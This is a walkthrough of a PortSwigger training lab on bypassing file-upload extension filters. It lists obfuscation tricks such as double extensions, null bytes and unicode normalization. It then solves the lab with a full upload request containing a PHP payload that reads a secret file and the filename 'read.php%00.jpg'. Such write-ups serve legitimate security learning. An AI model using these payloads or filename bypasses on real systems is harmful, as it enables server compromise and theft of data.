## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/d6b467a7-692b-4d62-a041-782a96b7b269)

## Overview :

### Obfuscating file extensions

Even the most exhaustive blacklists can potentially be bypassed using **classic obfuscation techniques**. Let's say the validation code is case sensitive and **fails to recognize that `exploit.pHp` is in fact a `.php` file**. If the code that subsequently maps the file extension to a MIME type is not case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server. 

 You can also achieve similar results using the following techniques:

- **Provide multiple extensions**- `exploit.php.jpg`
- **Add trailing characters**- Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
- **URL encoding (or double URL encoding) the dots, forward slashes, and backward slashes** -  If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
- **Add semicolons or URL-encoded null byte characters before the file extension** - If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- Try using **multibyte unicode characters**, which may be converted to _null bytes and dots after unicode conversion or normalization_. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` **if the filename parsed as a UTF-8 string**, but then converted to ASCII characters before being used in a path.

> Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied
> recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider
> what happens if you strip `.php` from the following filename: `exploit.p.phphp`

## Solution :

Log in as wiener using the credentials provided. Upload a *.php* file with the contents : `<?php echo file_get_contents('/home/carlos/secret'); ?>`

The following is the POST request sent when uploading an avatar.

```
POST /my-account/avatar HTTP/1.1
Host: 0a87008704f75da98037b8c300a60099.web-security-academy.net
Cookie: session=iDD3MDQvlWdNxVZsP37i3wNB6JgGcov3
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------6170160073347684872772099132
Content-Length: 535
Origin: https://0a87008704f75da98037b8c300a60099.web-security-academy.net
Referer: https://0a87008704f75da98037b8c300a60099.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------6170160073347684872772099132
Content-Disposition: form-data; name="avatar"; filename="read.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------6170160073347684872772099132
Content-Disposition: form-data; name="user"

wiener
-----------------------------6170160073347684872772099132
Content-Disposition: form-data; name="csrf"

ECWAM2zUPdHzP1UJam8yAr0TIumvPr9Q
-----------------------------6170160073347684872772099132--
```
Since we uploaded a .php file we get a response stating that only JPG & PNG files are allowed.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5d8f3d8a-d0ab-42a0-b17f-75a1c5d6a92f)


So I tried various obfuscating ways but he one that worked for me is changeing the filename parameter to - `filename="read.php.jpg"` 

The server just checks that it ends with *.jpg* , if YES then the file is uploaded. This is a very weak defense mechanism being implemented.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e254d0d3-d027-463d-b226-f792c23981e1)

But when we try to access the file, we get this error

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/efe5b6b6-770c-4ee5-8bc8-160edd4bd3ef)

Thjs is beacuse the file is saved with .jpg extension, so the server is facing error when processing it since it considers it as a jpg file.

To prevent this , we need to somehow make the server execute this as a .php file. For this we can use `%00` **nullbyte** character before the extension.

ie - `read.php%00.jpg` . This way when the server processes the file  using lower-level functions in C/C++, it treats nullbyte as end of string  & thus it is validated as  **read.php** and finally executes it.

So when we chaange `filename="read.php%00.jpg"` and forward the request, we get a response stating that **read.php** has been uploaded .

> Notice that the server response is **read.php** and not **read.php.jpg**

Now we can read the file at */files/avatars/read.php* to get the secret key of carlos.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/351bbb5e-01b6-47bc-8fa5-2bf716979ddf)

Submit the key to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/327afa21-769d-45b8-adf4-e7f8584c6f91)

